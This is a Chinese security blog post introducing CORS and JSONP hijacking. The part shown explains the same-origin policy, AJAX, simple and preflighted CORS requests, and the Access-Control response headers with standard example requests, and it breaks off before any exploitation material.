<script type="text/javascript" src="../../js/love.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CORS跨域漏洞与JSONP劫持 | wolke</title><meta name="keywords" content="Web安全,CSRF"><meta name="author" content="w01ke"><meta name="copyright" content="w01ke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前几天逛B站刷到个视频，UP主利用酷某音乐软件存在JSONP劫持漏洞获取了骗子绑定的手机号，于是我便搜集了些网上的资料对JSONP的相关知识点进行一个系统的学习，原视频如下 (function(){var player &#x3D; new DPlayer({&quot;container&quot;:document.getElementById(&quot;dplayer0&quot;),&quot;theme&quot;:&quot;#da4e7f&quot;,&quot;screensh">
<meta property="og:type" content="article">
<meta property="og:title" content="CORS跨域漏洞与JSONP劫持">
<meta property="og:url" content="https://wolke.cn/post/c8aa67d0.html">
<meta property="og:site_name" content="wolke">
<meta property="og:description" content="前几天逛B站刷到个视频，UP主利用酷某音乐软件存在JSONP劫持漏洞获取了骗子绑定的手机号，于是我便搜集了些网上的资料对JSONP的相关知识点进行一个系统的学习，原视频如下 (function(){var player &#x3D; new DPlayer({&quot;container&quot;:document.getElementById(&quot;dplayer0&quot;),&quot;theme&quot;:&quot;#da4e7f&quot;,&quot;screensh">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220310114917215.png">
<meta property="article:published_time" content="2022-03-10T03:43:27.000Z">
<meta property="article:modified_time" content="2022-04-19T04:58:37.875Z">
<meta property="article:author" content="w01ke">
<meta property="article:tag" content="Web安全">
<meta property="article:tag" content="CSRF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220310114917215.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://wolke.cn/post/c8aa67d0"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-OJPSSewJEa"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?9b5e9e86a0a422ec787d72998e8fdbff";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-Q0YHC68NHX"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-Q0YHC68NHX');
</script><link rel="stylesheet" href="/wolke" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: w01ke","link":"链接: ","source":"来源: wolke","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CORS跨域漏洞与JSONP劫持',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-04-19 12:58:37'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><script src="/live2d-widget/autoload.js"></script><script src="/live2d-widget/autoload.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
  'title',
  '#config-diff',
  '#body-wrap',
  '#rightside-config-hide',
  '#rightside-config-show',
  '.js-pjax'
]

if (false) {
  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
}

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.removeEventListener('scroll', window.tocScrollFn)
  window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'G-Q0YHC68NHX', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><meta name="generator" content="Hexo 5.4.0"><script src="/assets/js/DPlayer.min.js"></script></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">85</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">63</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-diamond"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/black.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wolke</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-diamond"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CORS跨域漏洞与JSONP劫持</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-10T03:43:27.000Z" title="发表于 2022-03-10 11:43:27">2022-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-19T04:58:37.875Z" title="更新于 2022-04-19 12:58:37">2022-04-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>27分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CORS跨域漏洞与JSONP劫持"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>前几天逛B站刷到个视频，UP主利用酷某音乐软件存在JSONP劫持漏洞获取了骗子绑定的手机号，于是我便搜集了些网上的资料对JSONP的相关知识点进行一个系统的学习，原视频如下</p>
<div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"theme":"#da4e7f","screenshot":true,"video":{"url":"/video/Av637198900.mp4","pic":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.png"},"danmaku":{"api":"https://dplayer.alone88.cn/v3/bilibili?cid=554223473","token":"tokendemo","addition":["https://dplayer.alone88.cn/v3/bilibili?cid=554223473"]}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script>

<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>CORS全称为Cross-Origin Resource Sharing，即跨域资源共享，用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。而CORS漏洞则是利用CORS技术窃取用户敏感数据。CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。</p>
<p>整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
<p>因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p>
<p>JSONP全称是Json With Padding，是基于JSON格式的为解决跨域请求而产生的解决实现方案。JSONP实现的基本原理是利用了HTML里<code>&lt;script&gt;&lt;/scirpt&gt;</code>元素标签，远程调用JSON文件来实现数据传递。当某网站通过JSONP的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的JSONP调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。</p>
<p>CORS漏洞、JSONP劫持实际上都属于CSRF跨站请求伪造漏洞，尽管二者已经出现了很多年，但由于部分厂商对此不够重视导致其仍在不断发展和扩散。</p>
<h2 id="1、同源策略"><a href="#1、同源策略" class="headerlink" title="1、同源策略"></a>1、同源策略</h2><p>对 CORS 的介绍要从浏览器的同源策略开始说起，SOP 全称为 Same Origin Policy，即同源策略。该策略是浏览器的一个安全基石，同源策略规定：<strong>不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。</strong></p>
<p>简单来说同源策略就是浏览器会阻止一个源与另一个源的资源交互。可以试想一下，如果没有同源策略，当你访问一个正常网站的时候又无意间打开了另一个恶意网站，恶意网站会从你刚刚访问的正常网站上窃取你全部的信息。所谓同源是指 <strong>域名，协议，端口相同</strong>。</p>
<h2 id="2、AJAX技术"><a href="#2、AJAX技术" class="headerlink" title="2、AJAX技术"></a>2、AJAX技术</h2><p>跨域问题是针对使用 <code>XMLHttpRequest</code> 技术构建的复杂的、动态的网页的编程实践技术—— AJAX 的，HTML 本身没有跨域问题。</p>
<p>​    AJAX 全称 Asynchronous JavaScript + XML，即异步 JavaScript 和 XML。AJAX 本身不是一种新技术，而是用来描述一种使用现有技术集合/标准的新方法，包括：HTML or XHTML、Cascading Style Sheets、JavaScript、The Document Object Model、XML、XSLT 以及 XMLHttpRequest object。AJAX 允许只更新一个 HTML 页面的部分 DOM，而无须重新加载整个页面， 网页应用能够快速地将增量更新呈现在用户界面上，而不需要重新加载整个页面。这使得程序能够更快地回应用户的操作。</p>
<p>【注意】尽管X在 Ajax 中代表 XML，但由于 JSON 的许多优势，比如更加轻量以及作为 Javascript 的一部分，目前 JSON 的使用比 XML 更加普遍。JSON 和 XML 都被用于在 Ajax 模型中打包信息。</p>
<p>当我们使用 AJAX 技术发送 <code>XMLHttpRequest</code> 请求的时候，如果请求的是别的域 (主机域名、端口) 不同时，那么就会产生跨域问题(受同源策略影响，客户端将无法获取服务端返回的数据，除非使用 CORS 跨域资源共享技术)。值得注意的是：跨域的问题是发生在<code>XMLHttpRequest</code> 请求的，也就是说，不是 <code>XMLHttpRequest</code> 请求是不会有跨域问题的。举个很简单的例子：在编写网页的时候，<code>&lt;img src = www.xxxx.xxxx/ &gt;</code>，在 CORS 跨域资源共享技术的作用下，URL 不是本域的还是可以正常获取该图片的。</p>
<h1 id="二、CORS跨域"><a href="#二、CORS跨域" class="headerlink" title="二、CORS跨域"></a>二、CORS跨域</h1><p>SOP 浏览器同源策略是一个很好的策略，在 SOP 被提出之后，大家都默默地遵守着这个规定，但随着WEB应用的发展，有些网站由于自身业务的需求，需要实现一些跨域的功能能够让不同域的页面之间能够相互访问各自页面的内容。常见需要跨域的业务场景如下：</p>
<ol>
<li>比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题；</li>
<li>程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送 ajax 请求，请求另外一个页面的内容的时候，就会跨域；</li>
<li>电商网站想通过用户浏览器加载第三方快递网站的物流信息；</li>
<li>子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</li>
</ol>
<p>为了实现这个跨域需求，聪明的程序员想到了一种编码技术 JSONP，该技术利用从客户端传入的 json 格式的返回值，在服务器端调用该接口处事先以定义函数的方式定义好 json 格式里参数值，并加载 script 标签调用该函数实现跨域。 JSONP 虽然好，但它并非是在协议层面解决跨域问题，所以出现了很多安全问题。</p>
<p>​    为了能更安全的进行跨域资源访问，CORS 诞生了。CORS 是 H5 提供的一种机制，<strong>WEB 应用程序可以通过在 HTTP 报文中增加特定字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源。</strong></p>
<h2 id="1、跨域流程"><a href="#1、跨域流程" class="headerlink" title="1、跨域流程"></a>1、跨域流程</h2><p>浏览器将CORS请求分成两类：<strong>简单请求</strong>（simple request）和 <strong>非简单请求</strong>（not-so-simple request）。只要同时满足以下两个条件就属于简单请求否则属于非简单请求（主要通过请求方法进行判断）：</p>
<ol>
<li><p>请求方法是以下三种之一</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
</li>
<li><p>HTTP的头信息不超出以下几种字段。</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Lat-Event-ID</li>
<li>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain。这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。</li>
</ul>
</li>
</ol>
<h3 id="（1）CORS跨域——简单请求的流程"><a href="#（1）CORS跨域——简单请求的流程" class="headerlink" title="（1）CORS跨域——简单请求的流程"></a>（1）CORS跨域——简单请求的流程</h3><p>对于简单请求，大致流程是浏览器发现这一次向服务器提交的请求是简单请求，所以自动在头信息中增加了一个<code>Origin</code>的字段，用来表示这次的请求来自哪个域。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cors</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.alice.com</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>上面的头信息中，<code>Origin</code>字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p>
<p>如果<code>Origin</code>指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含<code>Access-Control-Allow-Origin</code>字段（详见下文），就知道出错了，从而抛出一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p>
<p>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Access-Control-Expose-Headers</span><span class="punctuation">: </span>FooBar</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<p>上面的头信息之中，有三个与CORS请求相关的字段，都以<code>Access-Control-</code>开头。</p>
<ol>
<li><p><code>Access-Control-Allow-Origin</code>：该字段是必须存在的，它的值可能是 Origin 字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大；</p>
</li>
<li><p><code>Access-Control-Allow-Credentials</code>：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为<code>true</code>，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为<code>true</code>，如果服务器不要浏览器发送Cookie，删除该字段即可。<strong>但需要注意的是，如果要发送 cookie，Access-Control-Allow-Origin 就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略，</strong> <strong>只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</strong>  </p>
</li>
<li><p><code>Access-Control-Expose-Headers</code>：该字段可选。CORS请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。  </p>
</li>
</ol>
<p>具体的CORS简单跨域请求流程如下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646812634466-fbf45f2a-b577-47b3-a809-cf238b1ff447.png" alt="img"></p>
<h4 id="withCredentials-属性"><a href="#withCredentials-属性" class="headerlink" title="withCredentials 属性"></a>withCredentials 属性</h4><p>上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定<code>Access-Control-Allow-Credentials</code>字段。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<p>另一方面，开发者必须在AJAX请求中打开<code>withCredentials</code>属性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p>
<p>但是，如果省略<code>withCredentials</code>设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭<code>withCredentials</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr.withCredentials = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<h3 id="（2）CORS跨域——非简单请求的流程"><a href="#（2）CORS跨域——非简单请求的流程" class="headerlink" title="（2）CORS跨域——非简单请求的流程"></a>（2）CORS跨域——非简单请求的流程</h3><p>所谓非简单请求就是那种对服务器提出特殊要求的请求，例如请求方法为 PUT 或 DELETE。非简单的 CORS 请求会在正式通信之前，增加一次 HTTP 查询请求，称之为 “预检请求”（preflight） 。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单里以及可以使用哪些 HTTP 动词和头信息字段。只有获得了肯定响应，浏览器才会正式发出 <code>XMLHttpRequest</code> 请求，否则就报错。这种请求的好处是对传统的没有 CORS 支持的服务器减小压力，给服务器一个提前拒绝的机会。</p>
<h4 id="①-预检请求"><a href="#①-预检请求" class="headerlink" title="① 预检请求"></a>① 预检请求</h4><p>下面是一段浏览器的JavaScript脚本。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://api.alice.com/cors&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;PUT&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;X-Custom-Header&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>上面代码中，HTTP请求的方法是<code>PUT</code>，并且发送一个自定义头信息<code>X-Custom-Header</code>。</p>
<p>浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">OPTIONS</span> <span class="string">/cors</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Request-Method</span><span class="punctuation">: </span>PUT</span><br><span class="line"><span class="attribute">Access-Control-Request-Headers</span><span class="punctuation">: </span>X-Custom-Header</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.alice.com</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>“预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</p>
<p>除了Origin字段，”预检”请求的头信息包括两个特殊字段。</p>
<p><strong>（1）Access-Control-Request-Method</strong></p>
<p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是<code>PUT</code>。</p>
<p><strong>（2）Access-Control-Request-Headers</strong></p>
<p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p>
<h4 id="②-预检请求的回应"><a href="#②-预检请求的回应" class="headerlink" title="② 预检请求的回应"></a>② 预检请求的回应</h4><p>服务器收到”预检”请求以后，检查了<code>Origin</code>、<code>Access-Control-Request-Method</code>和<code>Access-Control-Request-Headers</code>字段以后，确认允许跨源请求，就可以做出回应。</p>
